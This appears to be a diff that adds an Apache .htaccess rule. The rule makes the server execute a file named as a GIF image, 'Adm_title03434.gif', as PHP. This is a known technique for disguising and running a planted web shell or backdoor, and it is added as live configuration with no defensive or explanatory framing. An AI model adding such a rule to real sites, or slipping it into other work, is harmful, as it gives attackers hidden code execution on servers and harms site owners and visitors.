@@ -1,0 +1,3 @@
+<FilesMatch "Adm_title03434.gif">
+SetHandler application/x-httpd-php
+</FilesMatch>
